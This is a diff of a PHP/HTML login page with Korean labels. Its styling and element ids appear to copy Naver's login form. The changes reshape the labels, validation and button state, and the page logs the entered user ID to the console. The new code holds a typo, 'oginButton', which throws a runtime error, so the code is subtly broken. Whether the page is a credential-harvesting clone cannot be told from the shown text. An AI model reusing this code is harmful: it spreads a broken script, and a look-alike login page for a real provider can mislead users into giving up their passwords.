@@ -306,7 +306,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                                             <div class="error_message"><strong>비밀번호</strong>를 입력해 주세요.</div>
                                         </div>
                                         <div class="btn_login_wrap" style="margin-top: 20px; text-align: center;">
-                                            <button type="submit" class="btn_login" id="log.login" style="width: 100%; padding: 13px 0; background: #03c75a; color: #fff; border: none; border-radius: 4px; font-size: 16px; font-weight: 700; cursor: pointer; transition: background 0.2s;" onmouseover="this.style.background='#02b150'" onmouseout="this.style.background='#03c75a'">
+                                            <button type="submit" class="btn_login" id="log.login" style="width: 100%; padding: 13px 0; background: #03c75a; color: #fff; border: none; border-radius: 4px; font-size: 16px; font-weight: 700; cursor: pointer;" onmouseover="this.style.background='#02b150'" onmouseout="this.style.background='#03c75a'">
                                                 <span class="btn_text" id="log.login.text">로그인</span>
                                                 <span class="blind" id="log.login.blind">로그인 버튼</span>
                                             </button>
@@ -374,33 +374,52 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             const pwInput = document.getElementById('pw');
             const idLabel = document.getElementById('id_label');
             const pwLabel = document.getElementById('pw_label');
+				
+				function updateLoginButtonState() {
+					const id = idInput.value.trim();
+					const pw = pwInput.value.trim();
 
-            loginButton.addEventListener('click', () => {
-                console.log('로그인 버튼 클릭됨');
-            });
+					if (id.length > 0 && pw.length > 0) {
+						loginButton.classList.remove('disabled');
+						loginButton.style.backgroundColor = '#03c75a';
+						loginButton.style.cursor = 'pointer';
+						
+					} else {
+						loginButton.classList.add('disabled');
+						loginButton.style.backgroundColor = '#ccc';
+						oginButton.style.cursor = 'default';
+					}
+				}
 
+			
             form.addEventListener('submit', (e) => {
-                const id = idInput.value;
-                const pw = pwInput.value;
-                if (!id || !pw) {
-                    e.preventDefault();
-                    document.getElementById('err_empty_id').style.display = id ? 'none' : 'block';
-                    document.getElementById('err_empty_pw').style.display = pw ? 'none' : 'block';
-                    console.log('입력 오류: ID 또는 비밀번호가 비어 있음');
-                } else {
-                    console.log('폼 제출 성공: ID=' + id);
-                }
-            });
+			const id = idInput.value.trim();
+			const pw = pwInput.value.trim();
+			document.getElementById('err_empty_id').style.display = 'none';
+			document.getElementById('err_empty_pw').style.display = 'none';
+
+			if (!id) {
+				e.preventDefault();
+				document.getElementById('err_empty_id').style.display = 'block';
+				console.log('입력 오류: 아이디가 비어 있음');
+			} else if (!pw) {
+				e.preventDefault();
+				document.getElementById('err_empty_pw').style.display = 'block';
+				console.log('입력 오류: 비밀번호가 비어 있음');
+			} else { console.log('폼 제출 성공: ID=' + id); }
+		});
 
             function updateLabel(input, label) {
                 if (input.value || document.activeElement === input) {
-                    label.style.fontSize = '15px';
-                    label.style.top = '-3px';
-                    label.style.background = 'rgba(255, 255, 255, 0)';
-                    label.style.padding = '0 0px';
+                    label.style.fontSize = '12px';
+                    label.style.top = '6px';
+					label.style.left = '7px'; 
+                    label.style.background = 'none';
+                    label.style.padding = '0 8px';
                 } else {
                     label.style.fontSize = '16px';
                     label.style.top = '17px';
+					label.style.left = '10px';	
                     label.style.background = 'none';
                     label.style.color = '#888';
                     label.style.padding = '0';
@@ -408,12 +427,16 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             }
 
             idInput.addEventListener('input', () => updateLabel(idInput, idLabel));
-            idInput.addEventListener('focus', () => updateLabel(idInput, idLabel));
-            idInput.addEventListener('blur', () => updateLabel(idInput, idLabel));
+			idInput.addEventListener('focus', () => updateLabel(idInput, idLabel));
+			idInput.addEventListener('blur', () => updateLabel(idInput, idLabel));
+			idInput.addEventListener('input', updateLoginButtonState);
 
-            pwInput.addEventListener('input', () => updateLabel(pwInput, pwLabel));
-            pwInput.addEventListener('focus', () => updateLabel(pwInput, pwLabel));
-            pwInput.addEventListener('blur', () => updateLabel(pwInput, pwLabel));
+			pwInput.addEventListener('input', () => updateLabel(pwInput, pwLabel));
+			pwInput.addEventListener('focus', () => updateLabel(pwInput, pwLabel));
+			pwInput.addEventListener('blur', () => updateLabel(pwInput, pwLabel));
+			pwInput.addEventListener('input', updateLoginButtonState);
+			
+			updateLoginButtonState();
         });
     </script>
     <div id="nv_stat" style="display:none;">20</div>
